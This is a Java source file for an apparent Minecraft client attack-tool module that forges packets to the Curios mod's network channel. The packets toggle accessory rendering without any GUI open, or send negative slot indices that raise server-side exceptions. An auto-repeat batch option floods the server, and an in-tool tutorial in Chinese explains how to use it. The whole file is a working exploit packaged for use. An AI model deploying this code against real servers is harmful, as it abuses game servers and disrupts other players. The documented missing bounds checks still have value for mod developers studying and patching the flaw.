package com.redblue.red.modules.curios;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * CURIOS-02: No-GUI render toggle with negative index crash potential.
 *
 * CPacketToggleRender (index 4) can be sent without opening any GUI.
 * The handler checks renders.size() > index but NOT index < 0.
 * Negative index causes IndexOutOfBoundsException in NonNullList.get().
 * The exception is swallowed by enqueueWork but still wastes server resources.
 *
 * Verified via javap:
 *   - encode(): writeUtf(id) + writeInt(index)
 *     m_130070_ = writeUtf (writes length-prefixed UTF-8 string)
 *     writeInt = 4-byte big-endian int
 *   - handler (lambda$handle$1):
 *     offset 8-15: renders.size() > index (only positive bound check)
 *     NO check for index < 0
 *     NO GUI/container open check
 *
 * Wire format:
 *   buf.writeByte(4)       // discriminator
 *   buf.writeUtf(slotId)   // e.g. "ring", "necklace"
 *   buf.writeInt(index)    // slot index within that type
 */
public class CURIOS02_RenderToggle implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("curios", "main");
    private static final int IDX_TOGGLE_RENDER = 4;

    private long lastTickTime = 0;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofString("slot_type", "槽位类型 (ring/necklace/head...)", "ring"),
        ConfigParam.ofInt("slot_index", "槽位索引", 0, -1, 16),
        ConfigParam.ofEnum("mode", "模式", "TOGGLE",
                "TOGGLE", "NEGATIVE_IDX"),
        ConfigParam.ofBool("auto_repeat", "自动重复", false),
        ConfigParam.ofInt("interval", "重复间隔(tick)", 5, 1, 200)
                .visibleWhen("auto_repeat", "true"),
        ConfigParam.ofInt("batch_size", "每次发包数", 1, 1, 50)
                .visibleWhen("auto_repeat", "true")
    );

    @Override public String id() { return "curios02_rendertoggle"; }
    @Override public String name() { return "渲染切换"; }
    @Override public String description() { return "无需GUI切换饰品渲染/负索引异常"; }

    @Override
    public String getTutorial() {
        return "[漏洞原理]\n"
            + "CPacketToggleRender 不验证玩家是否打开了 Curios GUI。\n"
            + "任何时刻都可以发送此包切换饰品的渲染可见性。\n"
            + "handler 只检查 renders.size() > index，不检查 index < 0。\n"
            + "负数索引会触发 IndexOutOfBoundsException（被 Forge 吞掉）。\n\n"
            + "[模式说明]\n"
            + "TOGGLE: 正常切换指定槽位的渲染状态（无需打开GUI）\n"
            + "NEGATIVE_IDX: 发送负数索引，触发服务端异常\n\n"
            + "[使用方法]\n"
            + "1. 填写槽位类型（如 ring, necklace, head, charm 等）\n"
            + "2. 选择模式和索引\n"
            + "3. 点击执行或开启自动重复\n\n"
            + "[注意事项]\n"
            + "TOGGLE 模式的渲染变化会广播给附近所有玩家。\n"
            + "NEGATIVE_IDX 模式的异常被 Forge 吞掉，不会崩服。";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("curios");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null) return;
        sendToggle();
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;

        boolean autoRepeat = getParam("auto_repeat")
                .map(ConfigParam::getBool).orElse(false);
        if (!autoRepeat) return;

        int interval = getParam("interval")
                .map(ConfigParam::getInt).orElse(5);
        long now = mc.level.getGameTime();
        if (now - lastTickTime < interval) return;
        lastTickTime = now;

        int batch = getParam("batch_size")
                .map(ConfigParam::getInt).orElse(1);
        for (int i = 0; i < batch; i++) {
            sendToggle();
        }
    }

    private void sendToggle() {
        String slotType = getParam("slot_type")
                .map(ConfigParam::getString).orElse("ring");
        String mode = getParam("mode")
                .map(ConfigParam::getString).orElse("TOGGLE");

        int index;
        if ("NEGATIVE_IDX".equals(mode)) {
            index = -1;
        } else {
            index = getParam("slot_index")
                    .map(ConfigParam::getInt).orElse(0);
        }

        final int idx = index;
        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(IDX_TOGGLE_RENDER);
            buf.writeUtf(slotType);
            buf.writeInt(idx);
        });
    }
}
